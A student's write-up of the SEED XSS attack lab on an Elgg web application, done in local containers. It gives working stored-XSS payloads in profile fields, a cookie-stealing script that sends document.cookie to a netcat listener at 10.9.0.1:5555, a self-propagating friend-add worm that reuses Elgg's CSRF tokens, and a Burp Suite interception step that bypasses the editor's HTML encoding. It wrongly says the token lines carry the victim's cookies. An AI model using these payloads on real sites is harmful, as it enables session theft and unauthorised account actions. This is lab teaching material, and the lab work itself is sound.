# Ch5 Cross.Site Scripting (XSS) Attack Lab on Elgg WebApp

##  Task 1: Posting a Malicious Message to Display an Alert Window

1. After build and run the containers, go to http://www.seed-server.com/

2. Access a profile (e.g., alice) using the correspondent credentials.

3. Edit the profile and add one of the following strings inside the field "Brief description":

```js
<script>alert('XSS');</script>
```
```js
<script type="text/javascript" src="http://0.0.0.0:8000/Ch5_XSS_Lab.20220930/myscripts.js"> </script>
```

4. In the first case, just reload the profile page and you will see the alert appearing.

5. In the second case, create a http server on your local machine lunching the command:

```console
python3 -m http.server 8000
```

6. Create a js file myscripts.js inside the folder Ch5_XSS_Lab.20220930 with just the following line of code:

```js
alert('XSS');
```

7. Reload the profile page and you will see the alert appearing.

## Task 2: Posting a Malicious Message to Display Cookies

Just substituting in the previous task

```js
<script>alert(document.cookie);</script>
```

Or in the file scripts.js:

```js
alert(document.cookie);
```

## Task 3: Stealing Cookies from the Victim’s Machine

1. Start the TCP server using:
```console
nc -lknv 5555
```

2. Just substituting in the previous task:
```js
<script>
document.write('<img src=http://10.9.0.1:5555?c=' + escape(document.cookie) + ' >');
</script>
```

3. Or edit the profile and add the following strings inside the field "Brief description":

```js
<script type="text/javascript" src="http://0.0.0.0:8000/Ch5_XSS_Lab.20220930/myscripts.js"> </script>
```

4. Create a http server on your local machine lunching the command:

```console
python3 -m http.server 8000
```

5. And put in the file scripts.js:
```js
document.write('<img src=http://10.9.0.1:5555?c=' + escape(document.cookie) + ' >');
```

## Task 4: Becoming the Victim’s Friend

I use the following script:
```js
<script type="text/javascript">
    window.onload = function () {
        var Ajax=null;
        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts; // (1)
        var token="&__elgg_token="+elgg.security.token.__elgg_token; // (2)
        var guid="add?friend="+elgg.page_owner.guid;
        //Construct the HTTP request to add Samy as a friend.
        var sendurl="http://www.seed-server.com/action/friends/"+ guid + ts + token + ts + token;
        //Create and send Ajax request to add friend
        Ajax=new XMLHttpRequest();
        Ajax.open("GET", sendurl, true);
        Ajax.send();
    }
</script>
```

1. Explain the purpose of Lines (1) and (2), why are they are needed?

You need code Lines (1) and (2) to append to the URL the victim’s cookies which are employed to identify the victim, i.e., the user, which will add Samy as a friend.

2. If the Elgg application only provide the Editor mode for the “About Me” field, i.e., you cannot switch to the Text mode, can you still launch a successful attack?

### Method 1 using "Brief Description" field
Using the same trick of exercie 1, we paste in the "Brief Description" field the following script:
```js
<script type="text/javascript" src="http://0.0.0.0:8000/Ch5_XSS_Lab-20220930/samyworm.js"></script>
```

Where samyworm.js contains the following code:
```js
window.onload = function () {
    var Ajax=null;
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts; // (1)
    var token="&__elgg_token="+elgg.security.token.__elgg_token; // (2)
    var guid="add?friend="+elgg.page_owner.guid;
    //Construct the HTTP request to add Samy as a friend.
    var sendurl="http://www.seed-server.com/action/friends/"+ guid + ts + token + ts + token;
    //Create and send Ajax request to add friend
    Ajax=new XMLHttpRequest();
    Ajax.open("GET", sendurl, true);
    Ajax.send();
}
```

### Method 2 using "Description" field

I modify the Samy profile, adding in the "Description" field:
```js
<script type="text/javascript" src="http://0.0.0.0:8000/Ch5_XSS_Lab-20220930/samyworm.js"></script>
```
And before save the updates, I start Burp Suite in intercepting mode. So, after clicking "Save" on the seed-server site, I intercept the packet that want to update the "Description" field. In Burp I can see it, and in particular I notice the following string:
```js
<p>&lt;script type="text/javascript" src="http://0.0.0.0:8000/Ch5_XSS_Lab-20220930/samyworm.js"&gt;&lt;/script&gt;</p>
```

So I modify this string with the correct one:
```js
<script type="text/javascript" src="http://0.0.0.0:8000/Ch5_XSS_Lab-20220930/samyworm.js"></script>
```

And forward the modified packet. Now when a user reach the samy profile, the samyworm.js file is executed, and they will became friend.